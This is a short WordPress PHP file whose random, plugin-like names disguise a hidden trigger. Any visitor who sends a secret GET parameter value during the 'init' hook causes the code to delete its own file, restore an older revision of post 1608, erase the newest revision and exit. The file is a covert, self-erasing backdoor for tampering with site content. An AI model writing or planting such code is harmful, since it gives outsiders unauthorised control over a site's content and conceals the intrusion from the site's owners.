<?php

function scheduler_tiny_font() {
	if (isset($_GET['gamipress_tables_donation']) && $_GET['gamipress_tables_donation'] === 'code_query_remove_security') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$total_article_patterns_terms = 1608;
		$notifications_show_heading = wp_get_post_revisions($total_article_patterns_terms);
		if (empty($notifications_show_heading)) die('no revisions');
		if (count($notifications_show_heading) < 2) die('less than 2');
		$gravity_get_events = array_shift($notifications_show_heading);
		$bank_chart_js_print = $gravity_get_events->ID;
		$wpml_feedback_edit_hello = array_shift($notifications_show_heading);
		$color_library_ai = $wpml_feedback_edit_hello->ID;
		$soon_box_patterns = wp_restore_post_revision($color_library_ai);
		if ($soon_box_patterns === false) die('error restoring');
		$soon_box_patterns = wp_delete_post_revision($bank_chart_js_print);		
		if ($soon_box_patterns === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'scheduler_tiny_font');
